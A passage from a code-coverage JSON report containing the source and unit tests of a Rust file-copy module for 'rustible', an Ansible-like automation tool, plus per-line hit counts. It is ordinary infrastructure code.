}},{"line":387,"address":[30226784],"length":1,"stats":{"Line":1}},{"line":393,"address":[30226827],"length":1,"stats":{"Line":1}},{"line":394,"address":[30226873],"length":1,"stats":{"Line":0}},{"line":396,"address":[30226929],"length":1,"stats":{"Line":1}},{"line":400,"address":[30226758,30226352,30226752],"length":1,"stats":{"Line":1}},{"line":407,"address":[30226688],"length":1,"stats":{"Line":1}},{"line":410,"address":[30226295,30225792,30226301],"length":1,"stats":{"Line":0}},{"line":411,"address":[30225832],"length":1,"stats":{"Line":0}},{"line":412,"address":[30226088,30226020],"length":1,"stats":{"Line":0}}],"covered":68,"coverable":171},{"path":["/","home","artur","Repositories","rustible","src","modules","copy.rs"],"content":"//! Copy module - Copy files to destination\n//!\n//! This module copies files from a source to a destination, with support for\n//! permissions, ownership, and backup creation. It supports both local operations\n//! and remote file transfers over SSH connections.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{Connection, TransferOptions};\nuse std::fs;\nuse std::io::{Read, Write};\nuse std::os::unix::fs::{MetadataExt, PermissionsExt};\nuse std::path::Path;\nuse std::sync::Arc;\n\n/// Module for copying files\npub struct CopyModule;\n\nimpl CopyModule {\n    fn get_file_checksum(path: \u0026Path) -\u003e std::io::Result\u003cString\u003e {\n        use std::collections::hash_map::DefaultHasher;\n        use std::hash::{Hash, Hasher};\n\n        let mut file = fs::File::open(path)?;\n        let mut contents = Vec::new();\n        file.read_to_end(\u0026mut contents)?;\n\n        let mut hasher = DefaultHasher::new();\n        contents.hash(\u0026mut hasher);\n        Ok(format!(\"{:x}\", hasher.finish()))\n    }\n\n    fn create_backup(dest: \u0026Path, backup_suffix: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        if dest.exists() {\n            let backup_path = format!(\"{}{}\", dest.display(), backup_suffix);\n            fs::copy(dest, \u0026backup_path)?;\n            Ok(Some(backup_path))\n        } else {\n            Ok(None)\n        }\n    }\n\n    fn set_permissions(path: \u0026Path, mode: Option\u003cu32\u003e) -\u003e ModuleResult\u003cbool\u003e {\n        if let Some(mode) = mode {\n            let current = fs::metadata(path)?.permissions().mode() \u0026 0o7777;\n            if current != mode {\n                fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n                return Ok(true);\n            }\n        }\n        Ok(false)\n    }\n\n    fn files_differ(src: \u0026Path, dest: \u0026Path) -\u003e std::io::Result\u003cbool\u003e {\n        if !dest.exists() {\n            return Ok(true);\n        }\n\n        let src_meta = fs::metadata(src)?;\n        let dest_meta = fs::metadata(dest)?;\n\n        // Quick check: different sizes means different content\n        if src_meta.len() != dest_meta.len() {\n            return Ok(true);\n        }\n\n        // Compare checksums\n        let src_checksum = Self::get_file_checksum(src)?;\n        let dest_checksum = Self::get_file_checksum(dest)?;\n\n        Ok(src_checksum != dest_checksum)\n    }\n\n    fn copy_content(content: \u0026str, dest: \u0026Path) -\u003e ModuleResult\u003c()\u003e {\n        let mut file = fs::File::create(dest)?;\n        file.write_all(content.as_bytes())?;\n        Ok(())\n    }\n\n    fn copy_file(src: \u0026Path, dest: \u0026Path, force: bool) -\u003e ModuleResult\u003c()\u003e {\n        if dest.exists() \u0026\u0026 !force {\n            let dest_meta = fs::metadata(dest)?;\n            if dest_meta.permissions().readonly() {\n                return Err(ModuleError::PermissionDenied(format!(\n                    \"Destination '{}' is read-only and force is not set\",\n                    dest.display()\n                )));\n            }\n        }\n\n        fs::copy(src, dest)?;\n        Ok(())\n    }\n\n    /// Compute a simple checksum for content comparison\n    fn compute_checksum(data: \u0026[u8]) -\u003e String {\n        use std::collections::hash_map::DefaultHasher;\n        use std::hash::{Hash, Hasher};\n\n        let mut hasher = DefaultHasher::new();\n        data.hash(\u0026mut hasher);\n        format!(\"{:x}\", hasher.finish())\n    }\n\n    /// Async implementation for remote copy using connection\n    async fn execute_remote_async(\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n        dest: \u0026str,\n        src: Option\u003c\u0026str\u003e,\n        content: Option\u003c\u0026str\u003e,\n        mode: Option\u003cu32\u003e,\n        owner: Option\u003c\u0026str\u003e,\n        group: Option\u003c\u0026str\u003e,\n        backup: bool,\n        backup_suffix: \u0026str,\n        check_mode: bool,\n        diff_mode: bool,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let dest_path = Path::new(dest);\n\n        // Determine the final destination path (handle directory destinations)\n        let final_dest = if connection.is_directory(dest_path).await.unwrap_or(false) {\n            if let Some(src_str) = src {\n                let src_path = Path::new(src_str);\n                dest_path.join(src_path.file_name().ok_or_else(|| {\n                    ModuleError::InvalidParameter(\n                        \"Cannot determine filename from source\".to_string(),\n                    )\n                })?)\n            } else {\n                return Err(ModuleError::InvalidParameter(\n                    \"Cannot copy content to a directory without specifying filename\".to_string(),\n                ));\n            }\n        } else {\n            dest_path.to_path_buf()\n        };\n\n        // Check if file already exists and get checksum\n        let (needs_copy, current_checksum) =\n            if connection.path_exists(\u0026final_dest).await.unwrap_or(false) {\n                // Download current content to check if it differs\n                if let Some(content_str) = content {\n                    // Compare content\n                    match connection.download_content(\u0026final_dest).await {\n                        Ok(existing) =\u003e {\n                            let existing_str = String::from_utf8_lossy(\u0026existing);\n                            (\n                                existing_str.as_ref() != content_str,\n                                Some(Self::compute_checksum(\u0026existing)),\n                            )\n                        }\n                        Err(_) =\u003e (true, None),\n                    }\n                } else if let Some(src_str) = src {\n                    // Compare file checksums\n                    let src_path = Path::new(src_str);\n                    if !src_path.exists() {\n                        return Err(ModuleError::ExecutionFailed(format!(\n                            \"Source file '{}' does not exist\",\n                            src_str\n                        )));\n                    }\n\n                    let src_content = fs::read(src_path).map_err(ModuleError::Io)?;\n\n                    match connection.download_content(\u0026final_dest).await {\n                        Ok(existing) =\u003e {\n                            let src_checksum = Self::compute_checksum(\u0026src_content);\n                            let dest_checksum = Self::compute_checksum(\u0026existing);\n                            (src_checksum != dest_checksum, Some(dest_checksum))\n                        }\n                        Err(_) =\u003e (true, None),\n                    }\n                } else {\n                    (false, None)\n                }\n            } else {\n                (true, None)\n            };\n\n        // Check if only permissions need updating\n        if !needs_copy {\n            let perm_changed = if let Some(m) = mode {\n                match connection.stat(\u0026final_dest).await {\n                    Ok(stat) =\u003e (stat.mode \u0026 0o7777) != m,\n                    Err(_) =\u003e false,\n                }\n            } else {\n                false\n            };\n\n            if perm_changed {\n                if check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would change permissions on '{}'\",\n                        final_dest.display()\n                    )));\n                }\n\n                // Update permissions via chmod command\n                let chmod_cmd = format!(\"chmod {:o} {}\", mode.unwrap(), final_dest.display());\n                connection.execute(\u0026chmod_cmd, None).await.map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to set permissions: {}\", e))\n                })?;\n\n                return Ok(ModuleOutput::changed(format!(\n                    \"Changed permissions on '{}'\",\n                    final_dest.display()\n                )));\n            }\n\n            return Ok(ModuleOutput::ok(format!(\n                \"File '{}' is already up to date\",\n                final_dest.display()\n            )));\n        }\n\n        // In check mode, report what would happen\n        if check_mode {\n            let src_display = if content.is_some() {\n                \"(content)\"\n            } else if let Some(s) = src {\n                s\n            } else {\n                \"\"\n            };\n\n            let diff = if diff_mode {\n                if let Some(content_str) = content {\n                    let before = if let Some(cksum) = current_checksum {\n                        format!(\"(existing file with checksum {})\", cksum)\n                    } else {\n                        String::new()\n                    };\n                    Some(Diff::new(before, content_str))\n                } else {\n                    Some(Diff::new(\n                        format!(\"(current state of {})\", final_dest.display()),\n                        format!(\"(contents of {})\", src_display),\n                    ))\n                }\n            } else {\n                None\n            };\n\n            let mut output = ModuleOutput::changed(format!(\n                \"Would copy {} to '{}'\",\n                src_display,\n                final_dest.display()\n            ));\n\n            if let Some(d) = diff {\n                output = output.with_diff(d);\n            }\n\n            return Ok(output);\n        }\n\n        // Create backup if requested\n        if backup \u0026\u0026 connection.path_exists(\u0026final_dest).await.unwrap_or(false) {\n            let backup_path = format!(\"{}{}\", final_dest.display(), backup_suffix);\n            let backup_dest = Path::new(\u0026backup_path);\n\n            // Download and re-upload as backup\n            match connection.download_content(\u0026final_dest).await {\n                Ok(backup_content) =\u003e {\n                    connection\n                        .upload_content(\u0026backup_content, backup_dest, None)\n                        .await\n                        .map_err(|e| {\n                            ModuleError::ExecutionFailed(format!(\"Failed to create backup: {}\", e))\n                        })?;\n                }\n                Err(e) =\u003e {\n                    return Err(ModuleError::ExecutionFailed(format!(\n                        \"Failed to read file for backup: {}\",\n                        e\n                    )));\n                }\n            }\n        }\n\n        // Build transfer options\n        let mut transfer_opts = TransferOptions::new();\n        if let Some(m) = mode {\n            transfer_opts = transfer_opts.with_mode(m);\n        }\n        if let Some(o) = owner {\n            transfer_opts = transfer_opts.with_owner(o);\n        }\n        if let Some(g) = group {\n            transfer_opts = transfer_opts.with_group(g);\n        }\n        transfer_opts = transfer_opts.with_create_dirs();\n\n        // Perform the copy\n        let src_display = if let Some(content_str) = content {\n            // Upload content directly\n            connection\n                .upload_content(content_str.as_bytes(), \u0026final_dest, Some(transfer_opts))\n                .await\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to upload content: {}\", e))\n                })?;\n            \"(content)\".to_string()\n        } else if let Some(src_str) = src {\n            // Upload file\n            let src_path = Path::new(src_str);\n            connection\n                .upload(src_path, \u0026final_dest, Some(transfer_opts))\n                .await\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to upload file: {}\", e))\n                })?;\n            src_str.to_string()\n        } else {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'src' or 'content' must be provided\".to_string(),\n            ));\n        };\n\n        // Get file info from remote\n        let mut output = ModuleOutput::changed(format!(\n            \"Copied {} to '{}'\",\n            src_display,\n            final_dest.display()\n        ));\n\n        // Add file metadata if available\n        if let Ok(stat) = connection.stat(\u0026final_dest).await {\n            output = output\n                .with_data(\"dest\", serde_json::json!(final_dest.to_string_lossy()))\n                .with_data(\"size\", serde_json::json!(stat.size))\n                .with_data(\n                    \"mode\",\n                    serde_json::json!(format!(\"{:o}\", stat.mode \u0026 0o7777)),\n                )\n                .with_data(\"uid\", serde_json::json!(stat.uid))\n                .with_data(\"gid\", serde_json::json!(stat.gid));\n        }\n\n        Ok(output)\n    }\n\n    /// Execute remote copy using the connection from context\n    /// Uses tokio::runtime::Handle::current().block_on() as a sync-\u003easync bridge\n    fn execute_remote(\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n        dest: \u0026str,\n        src: Option\u003c\u0026str\u003e,\n        content: Option\u003c\u0026str\u003e,\n        mode: Option\u003cu32\u003e,\n        owner: Option\u003c\u0026str\u003e,\n        group: Option\u003c\u0026str\u003e,\n        backup: bool,\n        backup_suffix: \u0026str,\n        check_mode: bool,\n        diff_mode: bool,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Use the current tokio runtime handle to execute async operations\n        // This allows us to bridge from the sync Module trait to async connection operations\n        let handle = tokio::runtime::Handle::current();\n        handle.block_on(Self::execute_remote_async(\n            connection,\n            dest,\n            src,\n            content,\n            mode,\n            owner,\n            group,\n            backup,\n            backup_suffix,\n            check_mode,\n            diff_mode,\n        ))\n    }\n\n    /// Execute local copy (when connection is None or local)\n    fn execute_local(\n        dest: \u0026str,\n        src: Option\u003c\u0026str\u003e,\n        content: Option\u003c\u0026str\u003e,\n        mode: Option\u003cu32\u003e,\n        force: bool,\n        backup: bool,\n        backup_suffix: \u0026str,\n        check_mode: bool,\n        diff_mode: bool,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let dest_path = Path::new(dest);\n\n        // Determine if we're copying from src or content\n        let (source_content, src_display) = if let Some(content_str) = content {\n            (Some(content_str.to_string()), \"(content)\".to_string())\n        } else if let Some(src_str) = src {\n            let src_path = Path::new(src_str);\n            if !src_path.exists() {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Source file '{}' does not exist\",\n                    src_str\n                )));\n            }\n            (None, src_str.to_string())\n        } else {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'src' or 'content' must be provided\".to_string(),\n            ));\n        };\n\n        // Check if dest is a directory\n        let final_dest = if dest_path.is_dir() {\n            if let Some(src_str) = src {\n                let src_path = Path::new(src_str);\n                dest_path.join(src_path.file_name().ok_or_else(|| {\n                    ModuleError::InvalidParameter(\n                        \"Cannot determine filename from source\".to_string(),\n                    )\n                })?)\n            } else {\n                return Err(ModuleError::InvalidParameter(\n                    \"Cannot copy content to a directory without specifying filename\".to_string(),\n                ));\n            }\n        } else {\n            dest_path.to_path_buf()\n        };\n\n        // Check if copy is needed\n        let needs_copy = if let Some(src_str) = src {\n            let src_path = Path::new(src_str);\n            Self::files_differ(src_path, \u0026final_dest)?\n        } else {\n            // For content, always check\n            if final_dest.exists() {\n                let mut existing = String::new();\n                fs::File::open(\u0026final_dest)?.read_to_string(\u0026mut existing)?;\n                existing != source_content.as_ref().unwrap().as_str()\n            } else {\n                true\n            }\n        };\n\n        if !needs_copy {\n            // Check if only permissions need updating\n            let perm_changed = if let Some(m) = mode {\n                if final_dest.exists() {\n                    let current = fs::metadata(\u0026final_dest)?.permissions().mode() \u0026 0o7777;\n                    current != m\n                } else {\n                    false\n                }\n            } else {\n                false\n            };\n\n            if perm_changed {\n                if check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would change permissions on '{}'\",\n                        final_dest.display()\n                    )));\n                }\n                Self::set_permissions(\u0026final_dest, mode)?;\n                return Ok(ModuleOutput::changed(format!(\n                    \"Changed permissions on '{}'\",\n                    final_dest.display()\n                )));\n            }\n\n            return Ok(ModuleOutput::ok(format!(\n                \"File '{}' is already up to date\",\n                final_dest.display()\n            )));\n        }\n\n        // In check mode, return what would happen\n        if check_mode {\n            let diff = if diff_mode {\n                if let Some(ref content_str) = source_content {\n                    let before = if final_dest.exists() {\n                        fs::read_to_string(\u0026final_dest).unwrap_or_default()\n                    } else {\n                        String::new()\n                    };\n                    Some(Diff::new(before, content_str.clone()))\n                } else {\n                    Some(Diff::new(\n                        format!(\"(current state of {})\", final_dest.display()),\n                        format!(\"(contents of {})\", src_display),\n                    ))\n                }\n            } else {\n                None\n            };\n\n            let mut output = ModuleOutput::changed(format!(\n                \"Would copy {} to '{}'\",\n                src_display,\n                final_dest.display()\n            ));\n\n            if let Some(d) = diff {\n                output = output.with_diff(d);\n            }\n\n            return Ok(output);\n        }\n\n        // Create backup if requested\n        let backup_file = if backup {\n            Self::create_backup(\u0026final_dest, backup_suffix)?\n        } else {\n            None\n        };\n\n        // Create parent directories if needed\n        if let Some(parent) = final_dest.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        // Perform the copy\n        if let Some(ref content_str) = source_content {\n            Self::copy_content(content_str, \u0026final_dest)?;\n        } else if let Some(src_str) = src {\n            let src_path = Path::new(src_str);\n            Self::copy_file(src_path, \u0026final_dest, force)?;\n        }\n\n        // Set permissions\n        let perm_changed = Self::set_permissions(\u0026final_dest, mode)?;\n\n        let mut output = ModuleOutput::changed(format!(\n            \"Copied {} to '{}'\",\n            src_display,\n            final_dest.display()\n        ));\n\n        if let Some(backup_path) = backup_file {\n            output = output.with_data(\"backup_file\", serde_json::json!(backup_path));\n        }\n\n        if perm_changed {\n            output = output.with_data(\"mode_changed\", serde_json::json!(true));\n        }\n\n        // Add file info to output\n        let meta = fs::metadata(\u0026final_dest)?;\n        output = output\n            .with_data(\"dest\", serde_json::json!(final_dest.to_string_lossy()))\n            .with_data(\"size\", serde_json::json!(meta.len()))\n            .with_data(\n                \"mode\",\n                serde_json::json!(format!(\"{:o}\", meta.permissions().mode() \u0026 0o7777)),\n            )\n            .with_data(\"uid\", serde_json::json!(meta.uid()))\n            .with_data(\"gid\", serde_json::json!(meta.gid()));\n\n        Ok(output)\n    }\n}\n\nimpl Module for CopyModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"copy\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Copy files to a destination\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Must have either src or content\n        if params.get(\"src\").is_none() \u0026\u0026 params.get(\"content\").is_none() {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'src' or 'content' must be provided\".to_string(),\n            ));\n        }\n\n        // Must have dest\n        if params.get(\"dest\").is_none() {\n            return Err(ModuleError::MissingParameter(\"dest\".to_string()));\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let dest = params.get_string_required(\"dest\")?;\n        let src = params.get_string(\"src\")?;\n        let content = params.get_string(\"content\")?;\n        let force = params.get_bool_or(\"force\", true);\n        let backup = params.get_bool_or(\"backup\", false);\n        let backup_suffix = params\n            .get_string(\"backup_suffix\")?\n            .unwrap_or_else(|| \"~\".to_string());\n        let mode = params.get_u32(\"mode\")?;\n        let owner = params.get_string(\"owner\")?;\n        let group = params.get_string(\"group\")?;\n\n        // Check if we have a remote connection\n        if let Some(ref connection) = context.connection {\n            // Remote execution via async connection\n            Self::execute_remote(\n                connection.clone(),\n                \u0026dest,\n                src.as_deref(),\n                content.as_deref(),\n                mode,\n                owner.as_deref(),\n                group.as_deref(),\n                backup,\n                \u0026backup_suffix,\n                context.check_mode,\n                context.diff_mode,\n            )\n        } else {\n            // Local execution (connection is None)\n            Self::execute_local(\n                \u0026dest,\n                src.as_deref(),\n                content.as_deref(),\n                mode,\n                force,\n                backup,\n                \u0026backup_suffix,\n                context.check_mode,\n                context.diff_mode,\n            )\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let dest = params.get_string_required(\"dest\")?;\n        let dest_path = Path::new(\u0026dest);\n        let content = params.get_string(\"content\")?;\n\n        // For remote connections, we need to fetch the remote file content\n        if let Some(ref connection) = context.connection {\n            // Use async bridge to get remote file content\n            let handle = tokio::runtime::Handle::current();\n\n            if let Some(content_str) = content {\n                let before = handle.block_on(async {\n                    match connection.download_content(dest_path).await {\n                        Ok(data) =\u003e String::from_utf8_lossy(\u0026data).to_string(),\n                        Err(_) =\u003e String::new(),\n                    }\n                });\n                return Ok(Some(Diff::new(before, content_str)));\n            }\n\n            let src = params.get_string(\"src\")?;\n            if let Some(src_str) = src {\n                let src_path = Path::new(\u0026src_str);\n                if src_path.exists() {\n                    let src_content = fs::read_to_string(src_path)\n                        .unwrap_or_else(|_| \"(binary file)\".to_string());\n                    let dest_content = handle.block_on(async {\n                        match connection.download_content(dest_path).await {\n                            Ok(data) =\u003e String::from_utf8_lossy(\u0026data).to_string(),\n                            Err(_) =\u003e String::new(),\n                        }\n                    });\n                    return Ok(Some(Diff::new(dest_content, src_content)));\n                }\n            }\n\n            return Ok(None);\n        }\n\n        // Local diff\n        if let Some(content_str) = content {\n            let before = if dest_path.exists() {\n                fs::read_to_string(dest_path).unwrap_or_default()\n            } else {\n                String::new()\n            };\n            return Ok(Some(Diff::new(before, content_str)));\n        }\n\n        let src = params.get_string(\"src\")?;\n        if let Some(src_str) = src {\n            let src_path = Path::new(\u0026src_str);\n            if src_path.exists() {\n                let src_content =\n                    fs::read_to_string(src_path).unwrap_or_else(|_| \"(binary file)\".to_string());\n                let dest_content = if dest_path.exists() {\n                    fs::read_to_string(dest_path).unwrap_or_else(|_| \"(binary file)\".to_string())\n                } else {\n                    String::new()\n                };\n                return Ok(Some(Diff::new(dest_content, src_content)));\n            }\n        }\n\n        Ok(None)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_copy_content() {\n        let temp = TempDir::new().unwrap();\n        let dest = temp.path().join(\"test.txt\");\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"content\".to_string(), serde_json::json!(\"Hello, World!\"));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(dest.exists());\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"Hello, World!\");\n    }\n\n    #[test]\n    fn test_copy_file() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"source.txt\");\n        let dest = temp.path().join(\"dest.txt\");\n\n        fs::write(\u0026src, \"Source content\").unwrap();\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(dest.exists());\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"Source content\");\n    }\n\n    #[test]\n    fn test_copy_idempotent() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"source.txt\");\n        let dest = temp.path().join(\"dest.txt\");\n\n        fs::write(\u0026src, \"Same content\").unwrap();\n        fs::write(\u0026dest, \"Same content\").unwrap();\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_copy_with_mode() {\n        let temp = TempDir::new().unwrap();\n        let dest = temp.path().join(\"test.txt\");\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"content\".to_string(), serde_json::json!(\"Hello\"));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n        params.insert(\"mode\".to_string(), serde_json::json!(0o755));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let meta = fs::metadata(\u0026dest).unwrap();\n        assert_eq!(meta.permissions().mode() \u0026 0o7777, 0o755);\n    }\n\n    #[test]\n    fn test_copy_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let dest = temp.path().join(\"test.txt\");\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"content\".to_string(), serde_json::json!(\"Hello\"));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would copy\"));\n        assert!(!dest.exists()); // File should not be created in check mode\n    }\n\n    #[test]\n    fn test_copy_with_backup() {\n        let temp = TempDir::new().unwrap();\n        let dest = temp.path().join(\"test.txt\");\n\n        // Create existing file\n        fs::write(\u0026dest, \"Old content\").unwrap();\n\n        let module = CopyModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"content\".to_string(), serde_json::json!(\"New content\"));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n        params.insert(\"backup\".to_string(), serde_json::json!(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.data.contains_key(\"backup_file\"));\n\n        let backup_path = temp.path().join(\"test.txt~\");\n        assert!(backup_path.exists());\n        assert_eq!(fs::read_to_string(\u0026backup_path).unwrap(), \"Old content\");\n    }\n}\n","traces":[{"line":22,"address":[26505328,26506016,26506010],"length":1,"stats":{"Line":1}},{"line":26,"address":[26505361],"length":1,"stats":{"Line":1}},{"line":27,"address":[26505451],"length":1,"stats":{"Line":1}},{"line":28,"address":[26505587,26505508],"length":1,"stats":{"Line":2}},{"line":30,"address":[26505714],"length":1,"stats":{"Line":1}},{"line":31,"address":[26505721],"length":1,"stats":{"Line":1}},{"line":32,"address":[26505753],"length":1,"stats":{"Line":1}},{"line":35,"address":[26491280,26492035,26492029],"length":1,"stats":{"Line":1}},{"line":36,"address":[26491349,26491430,26492008],"length":1,"stats":{"Line":2}},{"line":37,"address":[26491445],"length":1,"stats":{"Line":1}},{"line":38,"address":[26491751,26491670],"length":1,"stats":{"Line":2}},{"line":39,"address":[26491869],"length":1,"stats":{"Line":1}},{"line":41,"address":[26491363],"length":1,"stats":{"Line":0}},{"line":45,"address":[26504624],"length":1,"stats":{"Line":1}},{"line":46,"address":[26504676],"length":1,"stats":{"Line":1}},{"line":47,"address":[26504811,26504713],"length":1,"stats":{"Line":1}},{"line":48,"address":[26504933],"length":1,"stats":{"Line":1}},{"line":49,"address":[26504945],"length":1,"stats":{"Line":1}},{"line":50,"address":[26505055],"length":1,"stats":{"Line":1}},{"line":53,"address":[26504784],"length":1,"stats":{"Line":1}},{"line":56,"address":[26491238,26491263,26490176],"length":1,"stats":{"Line":1}},{"line":57,"address":[26490261],"length":1,"stats":{"Line":1}},{"line":58,"address":[26490275],"length":1,"stats":{"Line":1}},{"line":61,"address":[26490378,26490294],"length":1,"stats":{"Line":1}},{"line":62,"address":[26490468],"length":1,"stats":{"Line":1}},{"line":65,"address":[26490623],"length":1,"stats":{"Line":1}},{"line":66,"address":[26490753],"length":1,"stats":{"Line":0}},{"line":70,"address":[26490674,26490770],"length":1,"stats":{"Line":1}},{"line":71,"address":[26490886,26490937],"length":1,"stats":{"Line":2}},{"line":73,"address":[26491191,26491107],"length":1,"stats":{"Line":2}},{"line":76,"address":[26490144,26490150,26489728],"length":1,"stats":{"Line":1}},{"line":77,"address":[26489813],"length":1,"stats":{"Line":1}},{"line":78,"address":[26489911,26489979],"length":1,"stats":{"Line":2}},{"line":79,"address":[26490094],"length":1,"stats":{"Line":1}},{"line":82,"address":[26506448],"length":1,"stats":{"Line":1}},{"line":83,"address":[26506548,26506636],"length":1,"stats":{"Line":1}},{"line":84,"address":[26506652],"length":1,"stats":{"Line":0}},{"line":85,"address":[26506803],"length":1,"stats":{"Line":0}},{"line":86,"address":[26506873],"length":1,"stats":{"Line":0}},{"line":88,"address":[26506852],"length":1,"stats":{"Line":0}},{"line":93,"address":[26506576,26507151],"length":1,"stats":{"Line":1}},{"line":94,"address":[26507202],"length":1,"stats":{"Line":1}},{"line":98,"address":[26505088],"length":1,"stats":{"Line":0}},{"line":102,"address":[26505131],"length":1,"stats":{"Line":0}},{"line":103,"address":[26505151],"length":1,"stats":{"Line":0}},{"line":104,"address":[26505162],"length":1,"stats":{"Line":0}},{"line":108,"address":[26506032],"length":1,"stats":{"Line":0}},{"line":121,"address":[29046825,29047219],"length":1,"stats":{"Line":0}},{"line":124,"address":[25969842],"length":1,"stats":{"Line":0}},{"line":125,"address":[29047825,29047745],"length":1,"stats":{"Line":0}},{"line":126,"address":[29047855,29047940],"length":1,"stats":{"Line":0}},{"line":127,"address":[29047956,29048136,29048535,29068304],"length":1,"stats":{"Line":0}},{"line":128,"address":[29068351],"length":1,"stats":{"Line":0}},{"line":129,"address":[29068318],"length":1,"stats":{"Line":0}},{"line":133,"address":[29048559],"length":1,"stats":{"Line":0}},{"line":134,"address":[29047882],"length":1,"stats":{"Line":0}},{"line":138,"address":[29047705,29047777],"length":1,"stats":{"Line":0}},{"line":142,"address":[25969864],"length":1,"stats":{"Line":0}},{"line":145,"address":[29049051,29049186],"length":1,"stats":{"Line":0}},{"line":147,"address":[25969886],"length":1,"stats":{"Line":0}},{"line":148,"address":[29051050],"length":1,"stats":{"Line":0}},{"line":149,"address":[29051082,29051177],"length":1,"stats":{"Line":0}},{"line":151,"address":[29051196,29051299],"length":1,"stats":{"Line":0}},{"line":152,"address":[29051451,29051348],"length":1,"stats":{"Line":0}},{"line":155,"address":[29050971],"length":1,"stats":{"Line":0}},{"line":157,"address":[25970220,25970243],"length":1,"stats":{"Line":0}},{"line":159,"address":[29049700,29049562],"length":1,"stats":{"Line":0}},{"line":160,"address":[29049738],"length":1,"stats":{"Line":0}},{"line":161,"address":[29049773,29049834],"length":1,"stats":{"Line":0}},{"line":167,"address":[29050694,29049824,29050127],"length":1,"stats":{"Line":0}},{"line":169,"address":[25969908],"length":1,"stats":{"Line":0}},{"line":170,"address":[29052109],"length":1,"stats":{"Line":0}},{"line":171,"address":[29052243,29052141],"length":1,"stats":{"Line":0}},{"line":172,"address":[29052250,29052353],"length":1,"stats":{"Line":0}},{"line":173,"address":[29052360,29052442],"length":1,"stats":{"Line":0}},{"line":175,"address":[29052022],"length":1,"stats":{"Line":0}},{"line":178,"address":[29049605],"length":1,"stats":{"Line":0}},{"line":181,"address":[29048967],"length":1,"stats":{"Line":0}},{"line":185,"address":[29049165],"length":1,"stats":{"Line":0}},{"line":186,"address":[29052824,29052871,29052774],"length":1,"stats":{"Line":0}},{"line":187,"address":[25969930],"length":1,"stats":{"Line":0}},{"line":188,"address":[29056003],"length":1,"stats":{"Line":0}},{"